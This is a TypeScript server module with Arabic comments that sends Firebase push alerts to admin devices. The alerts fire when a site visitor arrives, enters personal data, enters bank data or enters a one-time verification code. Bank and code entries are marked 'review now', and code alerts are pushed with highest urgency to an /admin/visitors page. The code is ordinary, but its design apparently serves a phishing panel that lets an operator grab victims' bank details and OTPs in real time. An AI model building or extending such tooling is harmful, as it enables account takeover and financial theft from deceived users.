// Firebase Admin SDK للـ Push Notifications
import admin from "firebase-admin";

// ─── أنواع الإشعارات ─────────────────────────────────────────────────────
export type NotificationEvent = "visitor" | "personal" | "bank" | "otp";

export interface NotificationData {
  title: string;
  body: string;
  icon?: string;
  data?: {
    eventType: NotificationEvent;
    sessionId?: string;
    applicantName?: string;
    url?: string;
    timestamp: number;
  };
}

// ─── رسائل الإشعارات ────────────────────────────────────────────────────
const notificationMessages: Record<NotificationEvent, { title: string; body: string; sound?: string }> = {
  visitor: {
    title: "🆕 زائر جديد!",
    body: "زائر جديد دخل الموقع",
  },
  personal: {
    title: "👤 بيانات شخصية",
    body: "تم إدخال بيانات شخصية جديدة",
  },
  bank: {
    title: "🏦 بيانات البنك",
    body: "تم إدخال بيانات البنك - راجع الآن!",
  },
  otp: {
    title: "🔐 رمز تحقق!",
    body: "تم إدخال رمز التحقق - راجع الآن!",
  },
};

// ─── تهيئة Firebase Admin ─────────────────────────────────────────────────
let firebaseInitialized = false;

export function initializeFirebase() {
  if (firebaseInitialized) return true;

  try {
    // التحقق من وجود credentials
    const projectId = process.env.FIREBASE_PROJECT_ID;
    const clientEmail = process.env.FIREBASE_CLIENT_EMAIL;
    const privateKey = process.env.FIREBASE_PRIVATE_KEY;

    if (!projectId || !clientEmail || !privateKey) {
      console.log("[Firebase] ❌ Missing Firebase credentials!");
      console.log("[Firebase] Required env vars:");
      console.log("[Firebase]   - FIREBASE_PROJECT_ID");
      console.log("[Firebase]   - FIREBASE_CLIENT_EMAIL");
      console.log("[Firebase]   - FIREBASE_PRIVATE_KEY");
      return false;
    }

    // تهيئة Firebase Admin
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: projectId,
        clientEmail: clientEmail,
        privateKey: privateKey.replace(/\\n/g, "\n"),
      }),
    });

    firebaseInitialized = true;
    console.log("[Firebase] ✅ Firebase Admin initialized successfully");
    console.log(`[Firebase] Project ID: ${projectId}`);
    return true;
  } catch (error) {
    console.error("[Firebase] ❌ Failed to initialize Firebase:", error);
    return false;
  }
}

// ─── إرسال إشعار عبر FCM ────────────────────────────────────────────────
export async function sendFCMNotification(
  eventType: NotificationEvent,
  extraData?: { sessionId?: string; applicantName?: string }
): Promise<{ success: number; failed: number; error?: string }> {
  // تهيئة Firebase إذا لم تكن مهيأة
  if (!initializeFirebase()) {
    return { success: 0, failed: 0, error: "Firebase not initialized" };
  }

  const message = notificationMessages[eventType];
  const title = message.title;
  const body = extraData?.applicantName
    ? `${extraData.applicantName} - ${message.body}`
    : message.body;

  console.log(`[FCM] Sending notification: ${eventType}`);
  console.log(`[FCM] Title: ${title}`);
  console.log(`[FCM] Body: ${body}`);

  try {
    // ─── جلب FCM tokens من قاعدة البيانات ───────────────────────────────
    const { db, trustedDevicesTable } = await import("@workspace/db");
    const { eq } = await import("drizzle-orm");

    const devices = await db
      .select({
        pushSubscription: trustedDevicesTable.pushSubscription, // JSON object with token
      })
      .from(trustedDevicesTable)
      .where(eq(trustedDevicesTable.isActive, true));

    // استخراج الـ token من JSON
    const validTokens = devices
      .map(d => {
        if (!d.pushSubscription) return null;
        try {
          const parsed = typeof d.pushSubscription === 'string' 
            ? JSON.parse(d.pushSubscription) 
            : d.pushSubscription;
          return parsed.token || null;
        } catch {
          return null;
        }
      })
      .filter((token): token is string => Boolean(token));

    if (validTokens.length === 0) {
      console.log("[FCM] No FCM tokens found in database");
      return { success: 0, failed: 0 };
    }

    console.log(`[FCM] Sending to ${validTokens.length} device(s)`);

    // ─── إرسال الإشعارات ───────────────────────────────────────────────
    const results = await Promise.allSettled(
      validTokens.map(async (token) => {
        const messagePayload: admin.messaging.Message = {
          notification: {
            title,
            body,
          },
          data: {
            eventType,
            sessionId: extraData?.sessionId || "",
            applicantName: extraData?.applicantName || "",
            url: "/admin/visitors",
            timestamp: Date.now().toString(),
          },
          webpush: {
            notification: {
              title,
              body,
              icon: "/icons/icon-512x512.png",
              badge: "/icons/badge-72.png",
              tag: `event-${eventType}`,
              requireInteraction: eventType === "otp",
              vibrate: [200, 100, 200],
              dir: "rtl",
              lang: "ar",
            },
            fcmOptions: {
              link: "/admin/visitors",
            },
          },
          apns: eventType === "otp" ? {
            payload: {
              aps: {
                alert: {
                  title,
                  body,
                },
                "mutable-content": 1,
                sound: "default",
              },
            },
            headers: {
              "apns-priority": "10",
              "apns-push-type": "alert",
            },
          } : undefined,
        };

        const response = await admin.messaging().send({
          ...messagePayload,
          token,
        });

        console.log(`[FCM] ✅ Success for token: ${token.substring(0, 20)}...`);
        return { success: true, token };
      })
    );

    const successCount = results.filter(r => r.status === "fulfilled").length;
    const failedCount = results.filter(r => r.status === "rejected").length;

    // معالجة الأخطاء
    results.forEach((result, index) => {
      if (result.status === "rejected") {
        console.error(`[FCM] ❌ Failed for token ${validTokens[index]?.substring(0, 20)}...:`, result.reason);
      }
    });

    console.log(`[FCM] Complete: ${successCount} success, ${failedCount} failed`);
    return { success: successCount, failed: failedCount };

  } catch (error) {
    console.error("[FCM] Fatal error:", error);
    return { success: 0, failed: 0, error: String(error) };
  }
}

// ─── التحقق من حالة Firebase ────────────────────────────────────────────
export function isFirebaseConfigured(): boolean {
  return Boolean(
    process.env.FIREBASE_PROJECT_ID &&
    process.env.FIREBASE_CLIENT_EMAIL &&
    process.env.FIREBASE_PRIVATE_KEY
  );
}
